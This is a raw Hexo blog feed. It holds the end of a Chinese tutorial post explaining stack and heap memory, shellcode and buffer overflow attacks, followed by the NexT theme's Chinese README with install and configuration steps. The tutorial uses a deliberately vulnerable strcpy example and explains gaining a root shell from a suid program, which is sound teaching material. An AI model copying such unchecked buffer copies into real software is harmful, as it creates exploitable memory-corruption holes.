1、栈使用的是<a href="https://www.baidu.com/s?wd=%E4%B8%80%E7%BA%A7%E7%BC%93%E5%AD%98&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YdPWT3m1mzuHfsrAmdrjmk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1m4nH6YPjD" target="_blank" rel="noopener">一级缓存</a>，<br>他们通常都是被调用时处于存储空间中，调用完毕立即释放；<br>　　2、堆是存放在二级缓存中，生命周期由虚拟机的<a href="https://www.baidu.com/s?wd=%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YdPWT3m1mzuHfsrAmdrjmk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1m4nH6YPjD" target="_blank" rel="noopener">垃圾回收</a>算法来决定（并不是一旦成为孤儿对象就能被回收）。所以调用这些对象的速度要相对来得低一些。<br>　　三、堆栈数据结构区别：<br>　　堆（数据结构）：堆可以被看成是一棵树，如：堆排序；<br>　　栈（数据结构）：一种先进后出的数据结构。</p><p><a href="https://i.loli.net/2017/12/19/5a38a011238e1.png" data-fancybox="group" data-caption="4f5bc5f4976719177ea2b3bd0c245eae.png" class="fancybox"><img alt="4f5bc5f4976719177ea2b3bd0c245eae.png" title="4f5bc5f4976719177ea2b3bd0c245eae.png" data-src="https://i.loli.net/2017/12/19/5a38a011238e1.png" class="lazyload"></a><br><a href="https://i.loli.net/2017/12/19/5a38a0113bcc8.png" data-fancybox="group" data-caption="86868fb31754cae5ab910a3f2fc932a1.png" class="fancybox"><img alt="86868fb31754cae5ab910a3f2fc932a1.png" title="86868fb31754cae5ab910a3f2fc932a1.png" data-src="https://i.loli.net/2017/12/19/5a38a0113bcc8.png" class="lazyload"></a></p><p>Shellcode一般作为数据发送给服务端造成<a href="https://baike.baidu.com/item/%E6%BA%A2%E5%87%BA" target="_blank" rel="noopener">溢出</a>，不同数据对数据要求不同，因此，Shellcode也不一定相同。</p><p><strong>缓冲区溢出攻击原理</strong></p><p>通过往程序的<a href="https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA" target="_blank" rel="noopener">缓冲区</a>写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88" target="_blank" rel="noopener">堆栈</a>，使程序转而执行其它指令，以达到攻击的目的。造成缓冲区溢出的原因是程序中没有仔细检查用户输入的参数。例如下面程序：</p><p>void function(char *str) {</p><p>char buffer[16]; strcpy(buffer,str);</p><p>}</p><p>上面的<a href="https://baike.baidu.com/item/strcpy/5494519" target="_blank" rel="noopener">strcpy</a>（）将直接把str中的内容copy到buffer中。这样只要str的长度大于16，就会造成buffer的溢出，使程序运行出错。存在像strcpy这样的问题的标准函数还有<a href="https://baike.baidu.com/item/strcat/5522405" target="_blank" rel="noopener">strcat</a>（）、<a href="https://baike.baidu.com/item/sprintf/9703430" target="_blank" rel="noopener">sprintf</a>（）、<a href="https://baike.baidu.com/item/vsprintf/6390873" target="_blank" rel="noopener">vsprintf</a>（）、<a href="https://baike.baidu.com/item/gets/787649" target="_blank" rel="noopener">gets</a>（）、<a href="https://baike.baidu.com/item/scanf/10773316" target="_blank" rel="noopener">scanf</a>（）等。</p><p>当然，随便往<a href="https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA" target="_blank" rel="noopener">缓冲区</a>中填东西造成它溢出一般只会出现<strong>分段错误</strong>（Segmentation<br>fault），而不能达到攻击的目的。最常见的手段是通过制造缓冲区溢出使程序运行一个用户shell，再通过shell执行其它命令。如果该程序属于root且有suid权限的话，攻击者就获得了一个有<a href="https://baike.baidu.com/item/root%E6%9D%83%E9%99%90" target="_blank" rel="noopener">root权限</a>的shell，可以对系统进行任意操作了。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;逻辑运算指令和控制运算指令&quot;&gt;&lt;a href=&quot;#逻辑运算指令和控制运算指令&quot; class=&quot;headerlink&quot; title=&quot;逻辑运算指令和控制运算指令&quot;&gt;&lt;/a&gt;逻辑运算指令和控制运算指令&lt;/h2&gt;&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="汇编" scheme="https://kabeor.github.io/categories/%E6%B1%87%E7%BC%96/"/>
    
    <category term="漏洞银行逆向教程" scheme="https://kabeor.github.io/categories/%E6%B1%87%E7%BC%96/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E9%80%86%E5%90%91%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="漏洞银行" scheme="https://kabeor.github.io/tags/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>NexT README.cn</title>
    <link href="https://kabeor.github.io/README.cn/"/>
    <id>https://kabeor.github.io/README.cn/</id>
    <published>2018-01-31T16:00:00.000Z</published>
    <updated>2020-03-16T04:48:45.247Z</updated>
    
    <content type="html"><![CDATA[<p align="right"><a title="New «NexT» 6.0.0 version [Reloaded]" href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">NexT v6.0.0 here :triangular_flag_on_post:</a></p><h1 align="center">NexT</h1><p align="center">NexT 是一个高质量并且优雅的<a href="http://hexo.io" target="_blank" rel="noopener">Hexo</a> 主题。这是精心制作做出来的 hexo 主题。</p><p><a href="https://gitter.im/iissnan/hexo-theme-next?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge" target="_blank" rel="noopener"><img alt="Join the chat at https://gitter.im/iissnan/hexo-theme-next" data-src="https://badges.gitter.im/Join%20Chat.svg" class="lazyload"></a><br><a href="https://github.com/iissnan/hexo-theme-next/commits/master" target="_blank" rel="noopener"><img alt="mnt-image" data-src="https://img.shields.io/maintenance/yes/2017.svg" class="lazyload"></a><br><a href="https://travis-ci.org/iissnan/hexo-theme-next?branch=master" target="_blank" rel="noopener" title="Travis CI"><img alt="travis-image" data-src="https://travis-ci.org/iissnan/hexo-theme-next.svg?branch=master" class="lazyload"></a><br><a href="https://github.com/iissnan/hexo-theme-next/releases" target="_blank" rel="noopener"><img alt="rel-image" data-src="https://img.shields.io/github/release/iissnan/hexo-theme-next.svg" class="lazyload"></a><br><a href="http://hexo.io" target="_blank" rel="noopener"><img alt="hexo-image" data-src="https://img.shields.io/badge/hexo-%3E%3D%203.0-blue.svg" class="lazyload"></a><br><a href="LICENSE"><img alt="lic-image" data-src="https://img.shields.io/dub/l/vibe-d.svg" class="lazyload"></a></p><ul><li><a href="http://theme-next.iissnan.com" target="_blank">NexT 使用文档</a> |  <a href="README.md">English Documentation</a></li></ul><h2 id="实时预览-Live-Preview"><a href="#实时预览-Live-Preview" class="headerlink" title="实时预览 Live Preview"></a>实时预览 Live Preview</h2><ul><li>:heart_decoration: Muse 方案: <a href="https://leaferx.online" target="_blank" rel="noopener">LEAFERx</a> | <a href="https://notes.wanghao.work" target="_blank" rel="noopener">XiaMo</a> | <a href="https://oawan.me" target="_blank" rel="noopener">OAwan</a></li><li>:six_pointed_star: Mist 方案: <a href="https://blog.zzbd.org" target="_blank" rel="noopener">Jeff</a> | <a href="http://uchuhimo.me" target="_blank" rel="noopener">uchuhimo</a> | <a href="http://www.ixirong.com" target="_blank" rel="noopener">xirong</a></li><li>:pisces: Pisces 方案: <a href="http://notes.iissnan.com" target="_blank" rel="noopener">Vi</a> | <a href="https://acris.me" target="_blank" rel="noopener">Acris</a> | <a href="https://rainylog.com" target="_blank" rel="noopener">Rainy</a></li><li>:gemini: Gemini 方案: <a href="https://almostover.ru" target="_blank" rel="noopener">Ivan.Nginx</a> | <a href="http://sh.alynx.xyz" target="_blank" rel="noopener">Alynx</a> | <a href="https://raincal.top" target="_blank" rel="noopener">Raincal</a></li></ul><p>更多 NexT 例子点击 <a href="https://github.com/iissnan/hexo-theme-next/issues/119" target="_blank" rel="noopener">这里</a>.</p><h2 id="安装-Installation"><a href="#安装-Installation" class="headerlink" title="安装 Installation"></a>安装 Installation</h2><p><strong>1.</strong> 在终端切换到<strong>hexo 根</strong>目录. 在hexo目录下一定有 <code>node_modules</code>, <code>source</code>, <code>themes</code> 和其他文件夹:<br>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> hexo</span><br><span class="line">$ ls</span><br><span class="line">_config.yml  node_modules  package.json  public  scaffolds  <span class="built_in">source</span>  themes</span><br></pre></td></tr></table></figure></div></p><p><strong>2.</strong> 从 github 上获取主题 。这里有几种方式来获取主题:</p><h3 id="下载最新发布的版本-Download-tagged-release-version"><a href="#下载最新发布的版本-Download-tagged-release-version" class="headerlink" title="下载最新发布的版本  Download tagged release version"></a>下载<a href="https://github.com/iissnan/hexo-theme-next/releases/latest" target="_blank" rel="noopener">最新发布的版本</a>  Download tagged release version</h3><p>   在大多数情况下 <strong>稳定</strong>。 推荐用户下载这个。</p><p>   <a href="http://lmgtfy.com/?q=linux+curl+tar+wget+install" target="_blank" rel="noopener"><img alt="curl-tar-wget-image" data-src="https://img.shields.io/badge/install%20with%20-curl%20%7C%20tar%20%7C%20wget-blue.svg" class="lazyload"></a></p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mkdir themes/next</span><br><span class="line">$ curl -s https://api.github.com/repos/iissnan/hexo-theme-next/releases/latest | grep tarball_url | cut -d <span class="string">'"'</span> -f 4 | wget -i - -O- | tar -zx -C themes/next --strip-components=1</span><br></pre></td></tr></table></figure></div><h3 id="下载标签发布版本-Download-tagged-release-version"><a href="#下载标签发布版本-Download-tagged-release-version" class="headerlink" title="下载标签发布版本  Download tagged release version"></a>下载<a href="https://github.com/iissnan/hexo-theme-next/releases" target="_blank" rel="noopener">标签发布版本</a>  Download tagged release version</h3><p>   您必须定义版本。从<a href="https://github.com/iissnan/hexo-theme-next/tags" target="_blank" rel="noopener">标签列表</a>里选择版本替换<code>v5.1.2</code>。</p><p>   <a href="http://lmgtfy.com/?q=linux+curl+tar+install" target="_blank" rel="noopener"><img alt="curl-tar-image" data-src="https://img.shields.io/badge/install%20with%20-curl%20%7C%20tar-blue.svg" class="lazyload"></a></p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mkdir themes/next</span><br><span class="line">$ curl -L https://api.github.com/repos/iissnan/hexo-theme-next/tarball/v5.1.2 | tar -zxv -C themes/next --strip-components=1</span><br></pre></td></tr></table></figure></div><p>   <a href="http://lmgtfy.com/?q=linux+git+install" target="_blank" rel="noopener"><img alt="git-image" data-src="https://img.shields.io/badge/install%20with%20-git-blue.svg" class="lazyload"></a></p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --branch v5.1.2 https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></div><h3 id="下载最新的-master-分支-Download-latest-master-branch"><a href="#下载最新的-master-分支-Download-latest-master-branch" class="headerlink" title="下载最新的 master 分支  Download latest master branch"></a>下载<a href="https://github.com/iissnan/hexo-theme-next/archive/master.zip" target="_blank" rel="noopener">最新的 master 分支</a>  Download latest master branch</h3><p>  可能会 <strong>不稳定</strong>, 但是包含最新的特色，推荐开发者下载.</p><p>   <a href="http://lmgtfy.com/?q=linux+curl+tar+install" target="_blank" rel="noopener"><img alt="curl-tar-image" data-src="https://img.shields.io/badge/install%20with%20-curl%20%7C%20tar-blue.svg" class="lazyload"></a></p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mkdir themes/next</span><br><span class="line">$ curl -L https://api.github.com/repos/iissnan/hexo-theme-next/tarball | tar -zxv -C themes/next --strip-components=1</span><br></pre></td></tr></table></figure></div><p>   <a href="http://lmgtfy.com/?q=linux+git+install" target="_blank" rel="noopener"><img alt="git-image" data-src="https://img.shields.io/badge/install%20with%20-git-blue.svg" class="lazyload"></a></p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></div><p>  使用克隆命令，你将得到<strong>整个存储库</strong>。而且在任何时候你都可以切换到任何标签发布版本。<br>  获取标签列表：</p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> themes/next</span><br><span class="line">$ git tag -l</span><br><span class="line">…</span><br><span class="line">v5.0.0</span><br><span class="line">v5.0.1</span><br><span class="line">v5.1.0</span><br><span class="line">v5.1.1</span><br><span class="line">v5.1.2</span><br></pre></td></tr></table></figure></div><p>   例如, 你想要切换到<code>v5.1.0</code> <a href="https://github.com/iissnan/hexo-theme-next/tags" target="_blank" rel="noopener">标签发布版本</a>. 输入以下命令:</p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git checkout tags/v5.1.0</span><br><span class="line">Note: checking out <span class="string">'tags/v5.1.0'</span>.</span><br><span class="line">…</span><br><span class="line">HEAD now on 1f72f68... CSS: Remove global list-style setting of ul</span><br></pre></td></tr></table></figure></div><p>   如果你想切换回 <a href="https://github.com/iissnan/hexo-theme-next/commits/master" target="_blank" rel="noopener">master 分支</a>的话, 输入这个命令:</p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git checkout master</span><br></pre></td></tr></table></figure></div><p><strong>3.</strong> 在 <strong>hexo 根目录下</strong> 的配置文件<code>_config.yml</code>里设置主题:</p><pre><code>theme: next</code></pre><h3 id="Bugs"><a href="#Bugs" class="headerlink" title="Bugs"></a>Bugs</h3><p>对于那些遇到 <strong>Error: Cannot find module ‘hexo-util’</strong> <a href="https://github.com/iissnan/hexo-theme-next/issues/1490" target="_blank" rel="noopener">问题</a>的人, 请检查你的NPM 版本.</p><ul><li><code>版本 &gt; 3</code>: 如果仍然不行的话，请移除 <code>node_modules</code> 文件 然后重新安装，使用 <code>npm install</code>命令。</li><li><code>版本 &lt; 3</code>: 请通过<code>npm install --save-dev hexo-util</code>命令添加<code>hexo-util</code>到你的站点包依赖里</li></ul><h2 id="更新-Update"><a href="#更新-Update" class="headerlink" title="更新 Update"></a>更新 Update</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> themes/next</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure></div><h3 id="Bugs-1"><a href="#Bugs-1" class="headerlink" title="Bugs"></a>Bugs</h3><blockquote><p>提交您的更改或存储它们，然后才能合并。</p></blockquote><p>您必须提交，存储或放弃本地更改. 看 <a href="https://stackoverflow.com/a/15745424/5861495" target="_blank" rel="noopener">here</a> 是如何做的。</p><h3 id="使用Hexo-data-files-328-配置主题-Theme-configurations-using-Hexo-data-files-328"><a href="#使用Hexo-data-files-328-配置主题-Theme-configurations-using-Hexo-data-files-328" class="headerlink" title="使用Hexo data files(#328)配置主题  Theme configurations using Hexo data files #328"></a>使用Hexo data files(<a href="https://github.com/iissnan/hexo-theme-next/issues/328" target="_blank" rel="noopener">#328</a>)配置主题  Theme configurations using Hexo data files #328</h3><p>目前升级 NexT 主题的时候并不是非常的流畅。若使用 <code>git pull</code> 的方式，很多时候可能会产生冲突；而下载新版本覆盖安装的方式又需要手动合并主题的 <code>_config.yml</code> 文件。</p><p>在此修改之前， NexT 建议将配置分离，一部分在 站点的配置文件中，另外一部分在主题的配置文件中。将需要自定的选项放置在 站点配置文件中，从而脱离避免更新主题时可能遇到的麻烦。这种方式是可行，但是有一些缺点：</p><ol><li>配置分离成了两个部分</li><li>用户可能会疑惑一些选项该放置在哪里比较合适</li></ol><p>为了解决这个问题， NexT 将会使用 Hexo 的 <a href="https://hexo.io/docs/data-files.html" target="_blank" rel="noopener">Data Files</a> 。然而由于 Data Files 是在 Hexo 3 版本时引进的，所以要使用这个特性，需要 Hexo 的版本不低于 3。</p><p>若你比较喜欢 Hexo 2.x 版本，可以继续使用原先的配置方式。 NexT 保持着向下兼容。</p><h4 id="特性-Benefits"><a href="#特性-Benefits" class="headerlink" title="特性 Benefits"></a>特性 Benefits</h4><p>通过这个特性，你可以将所有的主题配置放置在站点的 <code>source/_data/next.yml</code> 文件中。原先放置在 站点配置文件 中的选项可以迁移到新的位置，同时，主题配置文件可以不用做任何修改。若后续版本有配置相关的改动时，你仅需在 <code>next.yml</code> 中做相应调整即可</p><h4 id="如何使用这个特性-How-to-use-this-feature"><a href="#如何使用这个特性-How-to-use-this-feature" class="headerlink" title="如何使用这个特性 How to use this feature"></a>如何使用这个特性 How to use this feature</h4><ol><li>请先确保你所使用的 Hexo 版本在 3 以上</li><li>在站点的 <code>source/_data</code> 目录下新建 <code>next.yml</code> 文件（<code>_data</code>目录可能需要新建）</li><li>迁移站点配置文件和主题配置文件中的配置到 <code>next.yml</code> 中</li><li>使用 <code>--config source/_data/next.yml</code> 参数启动服务器, 生成或者部署。<br>例如: <code>hexo clean --config source/_data/next.yml &amp;&amp; hexo g --config source/_data/next.yml</code>。</li></ol><h2 id="特色-Features"><a href="#特色-Features" class="headerlink" title="特色 Features"></a>特色 Features</h2><h3 id="支持多国语言-包括"><a href="#支持多国语言-包括" class="headerlink" title="支持多国语言, 包括:"></a>支持多国语言, 包括:</h3><p>:cn: 简体中文 &amp; 繁体中文<br><br>:us: 英语<br><br>:ru: 俄语<br><br>:fr: 法语<br><br>:de: 德语<br><br>:jp: 日语<br><br>:indonesia: 印度尼西亚语<br><br>:portugal: 葡萄牙语 (巴西)<br><br>:kr: 朝鲜语<br><br>:it: 意大利语<br><br>:netherlands: 荷兰语</p><p>默认语言是英语。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">en</span></span><br><span class="line"><span class="comment"># language: zh-Hans</span></span><br><span class="line"><span class="comment"># language: zh-hk</span></span><br><span class="line"><span class="comment"># language: zh-tw</span></span><br><span class="line"><span class="comment"># language: ru</span></span><br><span class="line"><span class="comment"># language: fr-FR</span></span><br><span class="line"><span class="comment"># language: de</span></span><br><span class="line"><span class="comment"># language: ja</span></span><br><span class="line"><span class="comment"># language: id</span></span><br><span class="line"><span class="comment"># language: pt</span></span><br><span class="line"><span class="comment"># language: pt-BR</span></span><br><span class="line"><span class="comment"># language: ko</span></span><br><span class="line"><span class="comment"># language: it</span></span><br><span class="line"><span class="comment"># language: nl-NL</span></span><br></pre></td></tr></table></figure></div><p>在站点配置文件<code>_config.yml</code>中可以将语言切换成中文</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">zh-Hans</span></span><br></pre></td></tr></table></figure></div><h3 id="评论支持-Comment-support"><a href="#评论支持-Comment-support" class="headerlink" title="评论支持 Comment support"></a>评论支持 Comment support</h3><p>NexT 已经原生支持 <code>多说</code> and <code>Disqus</code> 评论系统。</p><p>添加以下代码到你的主题配置文件 <code>_config.yml</code>:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">duoshuo:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">shortname:</span> <span class="string">your-duoshuo-shortname</span></span><br></pre></td></tr></table></figure></div><p>或者</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">disqus_shortname:</span> <span class="string">your-disqus-shortname</span></span><br></pre></td></tr></table></figure></div><h3 id="标签页-Tags-page"><a href="#标签页-Tags-page" class="headerlink" title="标签页 Tags page"></a>标签页 Tags page</h3><blockquote><p>添加一个标签页面，里面包含您网站中的所有标签。</p></blockquote><ul><li><p>创建一个名为 <code>tags</code> 页面</p><pre><code>hexo new page &quot;tags&quot;</code></pre></li><li><p>编辑标签页, 设置页面类型为<code>tags</code>.</p><pre><code>title: All tagsdate: 2014-12-22 12:39:04type: &quot;tags&quot;</code></pre></li><li><p>添加 <code>tags</code> 到主题配置文件 <code>_config.yml</code> 里:</p><pre><code>menu:  home: /  archives: /archives  tags: /tags</code></pre></li></ul><h3 id="分类页-Categories-page"><a href="#分类页-Categories-page" class="headerlink" title="分类页 Categories page"></a>分类页 Categories page</h3><blockquote><p>添加一个分类页面，里面包含您网站中的所有分类。</p></blockquote><ul><li><p>创建一个名为 <code>categories</code> 页面</p><pre><code>hexo new page &quot;categories&quot;</code></pre></li><li><p>编辑分类页, 设置页面类型为 <code>categories</code>.</p><pre><code>title: All categoriesdate: 2014-12-22 12:39:04type: &quot;categories&quot;</code></pre></li><li><p>添加 <code>categories</code> 到主题配置文件 <code>_config.yml</code> 里:</p><pre><code>menu:  home: /  archives: /archives  categories: /categories</code></pre></li></ul><h3 id="社交媒体-Social-Media"><a href="#社交媒体-Social-Media" class="headerlink" title="社交媒体 Social Media"></a>社交媒体 Social Media</h3><p>NexT 可以自动添加链接到您的社交媒体帐户里:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">your-github-url</span></span><br><span class="line">  <span class="attr">Twitter:</span> <span class="string">your-twitter-url</span></span><br><span class="line">  <span class="attr">Weibo:</span> <span class="string">your-weibo-url</span></span><br><span class="line">  <span class="attr">DouBan:</span> <span class="string">your-douban-url</span></span><br><span class="line">  <span class="attr">ZhiHu:</span> <span class="string">your-zhihu-url</span></span><br></pre></td></tr></table></figure></div><h3 id="Feed-链接-Feed-link"><a href="#Feed-链接-Feed-link" class="headerlink" title="Feed 链接 Feed link"></a>Feed 链接 Feed link</h3><blockquote><p>显示 feed 链接。</p></blockquote><p>在主题配置文件<code>_config.yml</code>里设置<code>rss</code> , 如下所示:</p><ol><li><p><code>rss: false</code> 会禁用 feed 链接。</p></li><li><p><code>rss:</code> 使用站点 feed 链接。这是默认的选项。</p><p> 按照插件<a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a>的README中的安装说明进行操作。在完成这个插件的配置后，Feed链接也生成好了</p></li><li><p><code>rss: http://your-feed-url</code> 设置你的 feed 链接.</p></li></ol><h3 id="内置5种代码高亮主题-Up-to-5-code-highlight-themes-built-in"><a href="#内置5种代码高亮主题-Up-to-5-code-highlight-themes-built-in" class="headerlink" title="内置5种代码高亮主题 Up to 5 code highlight themes built-in"></a>内置5种代码高亮主题 Up to 5 code highlight themes built-in</h3><p>NexT 使用的是 <a href="https://github.com/chriskempson/tomorrow-theme" target="_blank" rel="noopener">Tomorrow 主题</a> ，一共有5种主题供你选择。<br>Next 默认使用 <code>normal</code>. 下面是 <code>normal</code> 和 <code>night</code> 主题的预览:</p><p><a href="http://iissnan.com/nexus/next/tomorrow-normal.png" data-fancybox="group" data-caption="Tomorrow Normal Preview" class="fancybox"><img alt="Tomorrow Normal Preview" title="Tomorrow Normal Preview" data-src="http://iissnan.com/nexus/next/tomorrow-normal.png" class="lazyload"></a><br><a href="http://iissnan.com/nexus/next/tomorrow-night.png" data-fancybox="group" data-caption="Tomorrow Night Preview" class="fancybox"><img alt="Tomorrow Night Preview" title="Tomorrow Night Preview" data-src="http://iissnan.com/nexus/next/tomorrow-night.png" class="lazyload"></a></p><p>查看更多信息点击<a href="https://github.com/chriskempson/tomorrow-theme" target="_blank" rel="noopener">Tomorrow 主题</a>。</p><h2 id="配置-Configuration"><a href="#配置-Configuration" class="headerlink" title="配置 Configuration"></a>配置 Configuration</h2><p>NexT 的配置很少</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Menu configuration.</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Favicon</span></span><br><span class="line"><span class="attr">favicon:</span> <span class="string">/favicon.ico</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Avatar (put the image into next/source/images/)</span></span><br><span class="line"><span class="comment"># can be any image format supported by web browsers (JPEG,PNG,GIF,SVG,..)</span></span><br><span class="line"><span class="attr">avatar:</span> <span class="string">/default_avatar.png</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Code highlight theme</span></span><br><span class="line"><span class="comment"># available: normal | night | night eighties | night blue | night bright</span></span><br><span class="line"><span class="attr">highlight_theme:</span> <span class="string">normal</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fancybox for image gallery</span></span><br><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify the date when the site was setup</span></span><br><span class="line"><span class="attr">since:</span> <span class="number">2013</span></span><br></pre></td></tr></table></figure></div><h2 id="浏览器支持-Browser-support"><a href="#浏览器支持-Browser-support" class="headerlink" title="浏览器支持 Browser support"></a>浏览器支持 Browser support</h2><p><a href="http://iissnan.com/nexus/next/browser-support.png" data-fancybox="group" data-caption="Browser support" class="fancybox"><img alt="Browser support" title="Browser support" data-src="http://iissnan.com/nexus/next/browser-support.png" class="lazyload"></a></p><p><a href="https://www.browserstack.com/" target="_blank" rel="noopener"><img alt="Browser Stack" data-src=".github/browserstack_logo.png" class="lazyload"></a></p><blockquote><p><strong>BrowserStack</strong> is a cloud-based cross-browser testing tool that enables developers to test their websites across various browsers on different operating systems and mobile devices, without requiring users to install virtual machines, devices or emulators.</p></blockquote><h2 id="贡献-Contributing"><a href="#贡献-Contributing" class="headerlink" title="贡献 Contributing"></a>贡献 Contributing</h2><p>接受各种形式的贡献，包括不限于提交问题与需求，修复代码。等待您的<code>Pull Request</code>。</p><p>Any types of contribution are welcome. Thanks.</p><p><strong>ATTENTION! Contributors on Chinese docs needed!</strong><br>Need to translate from <a href="README.md">English docs</a> to Chinese docs.<br>Any help wanted!<br>Thank’s a lot!</p><h2 id="开发-Development"><a href="#开发-Development" class="headerlink" title="开发 Development"></a>开发 Development</h2><p>NexT 主旨在于简洁优雅且易于使用，所以首先要尽量确保 NexT 的简洁易用性。</p><p>NexT is built for easily use with elegant appearance. First things first, always keep things simple.</p><h2 id="开发历史-Changelog"><a href="#开发历史-Changelog" class="headerlink" title="开发历史 Changelog"></a><a href="https://github.com/iissnan/hexo-theme-next/wiki/Changelog" 